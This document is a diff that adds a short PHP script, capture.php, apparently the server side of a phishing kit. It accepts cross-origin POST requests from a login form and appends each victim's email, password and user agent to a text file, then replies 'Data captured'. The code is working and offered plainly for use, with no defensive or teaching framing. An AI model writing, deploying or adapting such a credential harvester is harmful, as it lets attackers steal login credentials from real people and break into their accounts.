@@ -1,0 +1,26 @@
+<?php
+// capture.php
+header('Content-Type: application/json');
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: POST');
+header('Access-Control-Allow-Headers: Content-Type');
+
+// Get the POST data
+$input = file_get_contents('php://input');
+$data = json_decode($input, true);
+
+if ($data) {
+    // Create log entry with timestamp
+    $timestamp = date('Y-m-d H:i:s');
+    $source = isset($data['source']) ? $data['source'] : 'main-login';
+    $log_entry = "[$timestamp] Source: $source | Email: {$data['email']} | Password: {$data['password']} | User Agent: {$data['userAgent']}\n";
+    
+    // Write to file
+    file_put_contents('captured_data.txt', $log_entry, FILE_APPEND);
+    
+    // Return success response
+    echo json_encode(['status' => 'success', 'message' => 'Data captured']);
+} else {
+    echo json_encode(['status' => 'error', 'message' => 'No data received']);
+}
+?> 
